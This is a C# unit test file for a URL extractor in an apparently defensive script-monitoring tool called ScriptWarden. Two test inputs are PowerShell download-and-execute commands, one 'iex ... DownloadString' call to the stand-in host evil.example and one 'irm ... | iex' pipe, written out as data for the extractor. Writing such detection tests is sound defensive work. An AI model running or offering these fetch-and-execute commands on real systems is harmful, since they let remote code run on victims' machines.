using ScriptWarden.Core;

namespace ScriptWarden.Tests;

public class UrlExtractorTests
{
    [Fact]
    public void ExtractsHttpsFromInlineIexDownload()
    {
        var urls = UrlExtractor.Extract("powershell.exe -Command \"iex (New-Object Net.WebClient).DownloadString('https://evil.example/x.ps1')\"");
        Assert.Contains("https://evil.example/x.ps1", urls);
    }

    [Fact]
    public void ExtractsIrmPipeIex()
    {
        var urls = UrlExtractor.Extract("irm https://get.example.com/install.ps1 | iex");
        Assert.Contains("https://get.example.com/install.ps1", urls);
    }

    [Fact]
    public void TrimsTrailingPunctuationAndClosers()
    {
        var urls = UrlExtractor.Extract("curl (http://host/a.txt), then http://host/b.txt.");
        Assert.Contains("http://host/a.txt", urls);
        Assert.Contains("http://host/b.txt", urls);
    }

    [Fact]
    public void CapturesHttpFtp()
    {
        var urls = UrlExtractor.Extract("x http://a.test/1 y ftp://b.test/2 z https://c.test/3");
        Assert.Equal(new[] { "http://a.test/1", "ftp://b.test/2", "https://c.test/3" }, urls);
    }

    [Fact]
    public void DeduplicatesCaseInsensitively()
    {
        var urls = UrlExtractor.Extract("https://a.test/x https://A.TEST/x");
        Assert.Single(urls);
    }

    [Fact]
    public void NoUrls_ReturnsEmpty()
    {
        Assert.Empty(UrlExtractor.Extract("powershell.exe -File C:\\it\\deploy.ps1"));
        Assert.Empty(UrlExtractor.Extract(null));
        Assert.Empty(UrlExtractor.Extract(""));
    }

    [Fact]
    public void DoesNotMatchUncOrBareHost()
    {
        // UNC paths and bare hostnames are not URLs (UNC is handled by the script-path heuristic).
        Assert.Empty(UrlExtractor.Extract(@"\\server\share\x.ps1 and example.com"));
    }
}
